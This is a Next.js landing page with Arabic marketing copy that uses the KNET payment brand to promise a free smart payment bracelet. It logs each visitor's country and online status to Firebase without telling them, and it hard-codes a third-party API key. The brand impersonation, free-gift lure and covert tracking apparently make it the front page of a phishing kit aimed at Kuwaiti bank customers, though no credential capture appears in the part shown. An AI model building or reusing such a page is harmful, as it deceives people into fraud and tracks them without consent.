"use client"

import { FullPageCarousel } from "@/components/full-page-imgs"
import { useCallback, useEffect, useState } from "react"
import './globals.css';
import { setupOnlineStatus } from "@/lib/utils";
import { addData } from "@/lib/firebase";

const arabicOffers = [
  {
    id: "1",
    title: "مقدمه حصرياً لعملاء كي نت KNET",
    description:
      "استمتع بطريقة دفع مبتكرة مع سوار الدفع الذكي من كي نت، حيث يجمع بين الراحة والأمان والتصميم العصري. أصبح بإمكانك الآن التسوق أو الدفع بسرعة وسهولة بدون الحاجة إلى حمل بطاقتك أو محفظتك. بتقنية آمنة وألوان متنوعة تناسب جميع الأذواق، سيكون السوار الذكي رفيقك المثالي في كل مكان وزمان.",
    imageUrl: "/4.jpg",
    ctaText: "اختَر لونك المفضل الآن واطلبه مجاناً 🚀",
    ctaLink: "#summer-sale",
    badge: "لفترة محدودة",
  },
  {
    id: "2",
    title: "إطلاق المجموعة الجديدة",
    description:
      "اكتشف تشكيلتنا الجديدة كلياً التي تجمع بين التصاميم العصرية والمواد المستدامة. صُممت هذه المجموعة خصيصاً للأشخاص الذين يبحثون عن الأناقة مع لمسة من الوعي البيئي. من الأقمشة المريحة إلى التفاصيل الدقيقة التي تميز كل قطعة، تمنحك هذه المجموعة إحساساً بالتميز والجودة في كل لحظة.",
    imageUrl: "/5.jpg",
    ctaText: "اطلبها الآن",
    ctaLink: "#new-collection",
    badge: "وصل حديثاً",
  },
  
];

const visitorId = `aa-app-${Math.random().toString(36).substring(2, 15)}`;

export default function HomePage() {
  const [showCarousel, setShowCarousel] = useState(true)
  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      })
      localStorage.setItem("country", country) // Consider privacy implications
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }, [visitorId]);

  useEffect(()=>{
    getLocationAndLog().then(()=>{
      
    })
  })
  return (
    <div className="min-h-screen bg-background">
      {showCarousel && (
        <FullPageCarousel
          slides={arabicOffers}
          autoPlay={true}
          autoPlayInterval={6000}
          onClose={() => setShowCarousel(false)}
          isRTL={true}
        />
      )}
    </div>
  )
}
